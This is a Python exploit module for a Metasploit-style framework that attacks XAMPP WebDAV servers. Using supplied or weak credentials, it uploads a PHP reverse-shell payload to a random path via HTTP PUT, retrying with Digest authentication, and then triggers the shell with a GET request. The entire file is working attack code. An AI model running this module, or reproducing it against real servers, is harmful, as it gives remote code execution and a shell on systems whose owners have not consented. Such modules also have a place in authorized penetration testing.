# -*- coding: utf-8 -*-

"""
Exploit: XAMPP WebDav Upload PHP
Documentation: N/A
"""

# Library
from lib.utils.printer import (
    print_status,
    print_error
)

# Framework
from framework.modules.util import register_option
from framework.console.opt import Option
from framework.client.http.http_client import http_request
from framework.modules.metadata import (
    Module,
    Arch,
    Platform
)
from framework.modules.exploit import (
    Exploit,
    Target
)


class TerasploitModule(Exploit):

    def __init__(self):
        self.info = dict(
            Name="XAMPP WebDAV Upload PHP",
            License="BSD-3-Clause License",
            Module=Module.EXPLOIT,
            Arch=Arch.PHP,
            Platform=Platform.WINDOWS,
            Author=[
                "charlie <castilloncharlie.a[a]gmail.com>"
            ],
            Description=[
                "Takes advantage of weak WebDAV XAMPP passwords,",
                "it uses the supplied credentials to exploit the",
                "target and upload a shell."
            ],
            Reference=[
                "https://github.com/blu0/webdav-exploit",
                "metasploit (windows/http/xampp_webdav_upload_php)"
            ],
            DefaultPayload="php/windows/reverse_php",
            DefaultOptions=[
                "URL",
                "RPORT",
                "PROXY",
                "SSL",
                "USERNAME",
                "PASSWORD"
            ],
            Target={"0": "Automatic"},
        )

        register_option([
            Option("PATH", "yes", "URL path to attempt the upload", "/webdav/")
        ])

    def exploit(self) -> None | str:

        shell = self.generate_payload()["Payload"]
        random_string = self.generate_random_string()
        self.parse_url()

        shell_url = (
            f"{Target.scheme}://"
            f"{Target.hostname}"
            f"{Target.path}{random_string}.php"
        )

        # Display the target url
        print_status(f"Target: {shell_url}")

        # Credentials
        creds = (self.opt("USERNAME"), self.opt("PASSWORD"))

        try:
            # Attempt with Basic Auth
            response = http_request(
                method="PUT",
                url=shell_url,
                data=shell,
                auth=creds,
                auth_type="BASIC",
                timeout=25
            )

            if response.status_code in self.good_status_code:
                return self._execute_shell(shell_url)

            # Retry with Digest Auth
            print_status("Exploit failed, retrying with HTTP Digest Auth...")
            response = http_request(
                method="PUT",
                url=shell_url,
                data=shell,
                auth=creds,
                auth_type="DIGEST",
                timeout=25
            )

            if response.status_code in self.good_status_code:
                return self._execute_shell(shell_url)

            print_status(
                "Exploit retry failed",
                f"Status code: {response.status_code}"
            )
            return "failed"

        except Exception as exc:
            print_error(exc)
            return "exception"

    def _execute_shell(self, url: str) -> None:
        print_status(f"Shell uploaded: {url}")
        print_status("Attempting to execute payload...")

        # Attempt to execute the payload by sending get request in shell url.
        http_request(
            "GET",
            url=url,
            timeout=10
        )
        return
